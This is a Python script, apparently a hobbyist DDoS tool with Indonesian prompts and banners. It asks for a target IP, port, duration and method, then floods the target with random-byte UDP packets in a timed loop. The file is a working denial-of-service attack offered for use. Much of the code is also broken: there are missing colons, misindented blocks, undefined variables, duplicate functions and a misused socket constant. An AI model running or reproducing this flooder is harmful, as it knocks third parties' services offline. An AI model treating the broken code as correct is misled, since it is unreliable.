import os
import codecs
import sys
import random
import threading
import time
import socket
from time import time as tt

os.system("clear")

print("""\033[91m

██╗░░██╗░█████╗░██╗░░░██╗██████╗░
╚██╗██╔╝██╔══██╗██║░░░██║╚════██╗
░╚███╔╝░███████║╚██╗░██╔╝░░███╔═╝
░██╔██╗░██╔══██║░╚████╔╝░██╔══╝░░
██╔╝╚██╗██║░░██║░░╚██╔╝░░███████╗
╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░╚══════╝
""")

username = str(input("\033[94m[XAV2] \033[93mUsername:"))
password = str(input("\033[94m[XAV2] \033[93mPassword:"))
if password == "TransformerXBumblebee" and username == "TransformerXBumblebee":
    print ("Telah Masuk Sebagai Transformer X Bumblebee")
    time.sleep(2)

else:
    print ("Passwordnya Salah Bruh.")
    time.sleep(999)

os.system("clear")
print("\033[92mConnecting To Server [\033[97m•\033[92m]")
time.sleep(0.5)


nicknm = "TransformerXIvan"

mt = """\033[96mUnder \033[0;93mmaintance"""

os.system("clear")

print("""\033[94m

██████████████████████████████████████████
█▄─▀█▀─▄█▄─▄▄─█─▄─▄─█─█─█─▄▄─█▄─▄▄▀█─▄▄▄▄█
██─█▄█─███─▄█▀███─███─▄─█─██─██─██─█▄▄▄▄─█
▀▄▄▄▀▄▄▄▀▄▄▄▄▄▀▀▄▄▄▀▀▄▀▄▀▄▄▄▄▀▄▄▄▄▀▀▄▄▄▄▄▀
""")
print("""\033[92m
| UDP             |
| OVH             |
| UDP-DOWN        |
| TCP             |
———————————————————
""")

ip = str(input("\033[91m====> ★ Masukan Target IP/Host   : "))
port = int(input("====> $ Masukan Target PORT   : "))
time = int(input("====> $ Masykan Target PACKET   : "))
threads = int(input("====> $ Masukan Target THREADS   : "))
choice = str(input("====> ★ Masukan Target METHODS   : "))

os.system("clear")

brand = """\033[94m
███████▓█████▓▓╬╬╬╬╬╬╬╬▓███▓╬╬╬╬╬╬╬▓╬╬▓█
████▓▓▓▓╬╬▓█████╬╬╬╬╬╬███▓╬╬╬╬╬╬╬╬╬╬╬╬╬█
███▓▓▓▓╬╬╬╬╬╬▓██╬╬╬╬╬╬▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
████▓▓▓╬╬╬╬╬╬╬▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
███▓█▓███████▓▓███▓╬╬╬╬╬╬▓███████▓╬╬╬╬▓█
████████████████▓█▓╬╬╬╬╬▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬█
███▓▓▓▓▓▓▓▓▓▓▓▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
████▓▓▓▓▓▓▓▓▓▓▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
███▓█▓▓▓▓▓▓▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
█████▓▓▓▓▓▓▓▓█▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
█████▓▓▓▓▓▓▓██▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██
█████▓▓▓▓▓████▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██
████▓█▓▓▓▓██▓▓▓▓██╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██
████▓▓███▓▓▓▓▓▓▓██▓╬╬╬╬╬╬╬╬╬╬╬╬█▓╬▓╬╬▓██
█████▓███▓▓▓▓▓▓▓▓████▓▓╬╬╬╬╬╬╬█▓╬╬╬╬╬▓██
█████▓▓█▓███▓▓▓████╬▓█▓▓╬╬╬▓▓█▓╬╬╬╬╬╬███
██████▓██▓███████▓╬╬╬▓▓╬▓▓██▓╬╬╬╬╬╬╬▓███
███████▓██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬████
███████▓▓██▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓████
████████▓▓▓█████▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█████
█████████▓▓▓█▓▓▓▓▓███▓╬╬╬╬╬╬╬╬╬╬╬▓██████
██████████▓▓▓█▓▓▓▓▓██╬╬╬╬╬╬╬╬╬╬╬▓███████
███████████▓▓█▓▓▓▓███▓╬╬╬╬╬╬╬╬╬▓████████
██████████████▓▓▓███▓▓╬╬╬╬╬╬╬╬██████████
███████████████▓▓▓██▓▓╬╬╬╬╬╬▓███████████

\033[91m     PUNYA IvanXTransformer🌹IvanXTransformer
"""

os.system("clear")

def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(65535, port))
    print(brand)
    print("\033[92m ★★★★ DARI IvanXTransformer EUYY ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(666, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or random.randint(1, 65535)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(65535, port))
    print(brand)
    print("\033[92m ★★★★ DARI IvanXTransformer EUYY ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(16, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or random.randint(1, 65535)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def randsender(host, timer, port, punch):
    global iaid
    global aid
    global tattacks
    global running

    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

    iaid += 1
    aid += 1
    tattacks += 1
    running += 1
    while time.time() < timeout and ldap and attack:
        sock.sendto(punch, (host, int(port)))
    running -= 1
    iaid -= 1
    aid -= 1
              
              


def stdsender(host, port, timer, payload):
    global atks
    global running

    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    atks += 1
    running += 1
    while time.time() < timeout and attack:
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
    atks -= 1
    running -= 1

def main():
    global fsubs
    global tpings
    global pscans
    global liips
    global tattacks
    global uaid
    global running
    global atk
    global ldap
    global said
    global iaid
    global haid
    global aid
    global attack
    global dp

if choice == 'UDP'
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 55055
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
                    os.system("clear")
                    print(start)
                    time.sleep(1)
                    os.system("clear")
                    print(start2)
                    time.sleep(1)
                    os.system("clear")
                    print(start3)
                    time.sleep(1)
                    os.system("clear")
                    print(start4)
                    time.sleep(1)
                    os.system("clear")
                    print(start5)
                    time.sleep(1)
                    os.system("clear")
                    print(start6)
                    time.sleep(1)
                    os.system("clear")
                    print(start7)
                    time.sleep(1)
                    os.system("clear")
                    print(start8)
                    time.sleep(1)
                    os.system("clear")
                    print(start9)
                    time.sleep(1)
                    os.system("clear")
                    print(start10)
                    time.sleep(1)                    
                    print(attacked)

            except ValueError:
                main()
            except socket.gaierror:
                main()
                
if choice == 'OVH'
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                        sinput, host, timer, port = sin.split(" ")
                        socket.gethostbyname(host)
                        payload = b"\x00\x02\x00\x2f"
                        threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
                        os.system("clear")
                        print(start)
                        time.sleep(1)
                        os.system("clear")
                        print(start2)
                        time.sleep(1)
                        os.system("clear")
                        print(start3)
                        time.sleep(1)
                        os.system("clear")
                        print(start4)
                        time.sleep(1)
                        os.system("clear")
                        print(start5)
                        time.sleep(1)
                        os.system("clear")
                        print(start6)
                        time.sleep(1)
                        os.system("clear")
                        print(start7)
                        time.sleep(1)
                        os.system("clear")
                        print(start8)
                        time.sleep(1)
                        os.system("clear")
                        print(start9)
                        time.sleep(1)
                        os.system("clear")
                        print(start10)
                        time.sleep(1)                    
                        print(attacked)

            except ValueError:
                main()
            except socket.gaierror:
                main()

if choice == 'UDPDOWN'
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 55055
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
                    os.system("clear")
                    print(start)
                    time.sleep(1)
                    os.system("clear")
                    print(start2)
                    time.sleep(1)
                    os.system("clear")
                    print(start3)
                    time.sleep(1)
                    os.system("clear")
                    print(start4)
                    time.sleep(1)
                    os.system("clear")
                    print(start5)
                    time.sleep(1)
                    os.system("clear")
                    print(start6)
                    time.sleep(1)
                    os.system("clear")
                    print(start7)
                    time.sleep(1)
                    os.system("clear")
                    print(start8)
                    time.sleep(1)
                    os.system("clear")
                    print(start9)
                    time.sleep(1)
                    os.system("clear")
                    print(start10)
                    time.sleep(1)                    
                    print(attacked)

            except ValueError:
                main()
            except socket.gaierror:
                main()
                
if choice == 'TCP'
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 55055
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
                    os.system("clear")
                    print(start)
                    time.sleep(1)
                    os.system("clear")
                    print(start2)
                    time.sleep(1)
                    os.system("clear")
                    print(start3)
                    time.sleep(1)
                    os.system("clear")
                    print(start4)
                    time.sleep(1)
                    os.system("clear")
                    print(start5)
                    time.sleep(1)
                    os.system("clear")
                    print(start6)
                    time.sleep(1)
                    os.system("clear")
                    print(start7)
                    time.sleep(1)
                    os.system("clear")
                    print(start8)
                    time.sleep(1)
                    os.system("clear")
                    print(start9)
                    time.sleep(1)
                    os.system("clear")
                    print(start10)
                    time.sleep(1)                    
                    print(attacked)

            except ValueError:
                main()
            except socket.gaierror:
                main()

if choice == 'TCPBYPASS'
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 55055
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
                    os.system("clear")
                    print(start)
                    time.sleep(1)
                    os.system("clear")
                    print(start2)
                    time.sleep(1)
                    os.system("clear")
                    print(start3)
                    time.sleep(1)
                    os.system("clear")
                    print(start4)
                    time.sleep(1)
                    os.system("clear")
                    print(start5)
                    time.sleep(1)
                    os.system("clear")
                    print(start6)
                    time.sleep(1)
                    os.system("clear")
                    print(start7)
                    time.sleep(1)
                    os.system("clear")
                    print(start8)
                    time.sleep(1)
                    os.system("clear")
                    print(start9)
                    time.sleep(1)
                    os.system("clear")
                    print(start10)
                    time.sleep(1)                    
                    print(attacked)

            except ValueError:
                main()
            except socket.gaierror:
                main()

if choice == 'UDPBYPASS'
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 55055
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
                    os.system("clear")
                    print(start)
                    time.sleep(1)
                    os.system("clear")
                    print(start2)
                    time.sleep(1)
                    os.system("clear")
                    print(start3)
                    time.sleep(1)
                    os.system("clear")
                    print(start4)
                    time.sleep(1)
                    os.system("clear")
                    print(start5)
                    time.sleep(1)
                    os.system("clear")
                    print(start6)
                    time.sleep(1)
                    os.system("clear")
                    print(start7)
                    time.sleep(1)
                    os.system("clear")
                    print(start8)
                    time.sleep(1)
                    os.system("clear")
                    print(start9)
                    time.sleep(1)
                    os.system("clear")
                    print(start10)
                    time.sleep(1)                    
                    print(attacked)

            except ValueError:
                main()
            except socket.gaierror:
                main()
                
if __name__ == '__main__':
    try:
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
    except KeyboardInterrupt:
        print('Attack stopped.')